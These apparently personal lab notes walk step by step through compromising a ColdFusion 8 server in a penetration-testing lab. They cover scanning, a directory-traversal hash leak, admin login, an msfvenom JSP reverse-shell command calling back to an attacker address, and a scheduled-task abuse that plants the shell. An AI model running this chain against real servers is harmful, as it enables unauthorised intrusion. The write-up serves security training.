Getting a Foothold

Getting a Foothold

# Works
1. TCP port scan via NMAP using no ping switch (-Pn) reveals one open port 80.

2. Run a non-recursive dirb scan on port 80. Reveals 2 interesting directories: 10.11.1.10/cfdocs and 10.11.1.10/cfide. 

3. Run a Nikto scan and see that there is mention of ColdFusion Administrator link.

4. Run dirb on the ColdFusion Administrator link 10.11.1.10/cfide/administrator/ and discover many directories

5. Research for a default administrator password. Findings indicate that ColdFusion in general is susceptible to directory traversal.

6. Run searchsploit 14641 to find the 'admin' password hash 

7. Crack the ColdFusion 8 'admin' password hash on crackstation.net

8. Login to ColdFusion 8 with admin:pass123

9. Notice that there is a feature to schedule tasks which allows one to download files from a webserver and save them locally. 

10. Verify a path where we can save shellcode using Server Settings -> Mappings

11. Generate a .jsp shell because ColdFusion serves and runs .jsp files
### msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.214 LPORT=443 -f raw > shell.jsp
![8533c0d325c0cb6b816dc36ff5007986.png](../../_resources/4927083854ed49f885fe939d62ee5054.png)

12. Serve shell.jsp on port 80:
### python -m SimpleHTTPServer 80
![ef8504e0b18bd0d3074147b32a0ba2d5.png](../../_resources/bde568b6b389478998c0d8cef80cfd12.png)

13. Schedule a task in ColdFusion to run our webshell.
![03bad07499fb3d63ece95e3f77975ed6.png](../../_resources/80ce07bd386040f3bec85c183500516a.png)

14. The following fields must be input, then press 'Submit':
- Task Name: shell
- URL: http://192.168.119.214/shell.jsp
- Publish: Ensure that the 'Save output to a file' is checkmarked
- File: C:\Inetpub\wwwroot\CFIDE\shell.jsp 
**Ensure that the 'File' field does not have any empty spaces before the path name**
![b8924c79c89469d840ee6413d68738a6.png](../../_resources/40549031d805467a8de54d25a668c76a.png)

15. Verify that shell.jsp was served to our target
![51d5e4d806a933d613f15cffb155e252.png](../../_resources/08da449b6edb4352b4c55206fca3db67.png)

16. Set up a netcat listener on port 443 to catch the webshell
![fa7d968101f58bb1c507959fd6af22c3.png](../../_resources/d806078176334e2f8781cfefbea6d8f3.png)

16. Browse to the webshell on the target
### http://10.11.1.10/CFIDE/shell.jsp

17. We now have a shell!
![c1178d1b1b80dd4334b3f1fc59f8c5ed.png](../../_resources/3e4cb8c3502d4dcf90612d6792697d2e.png)
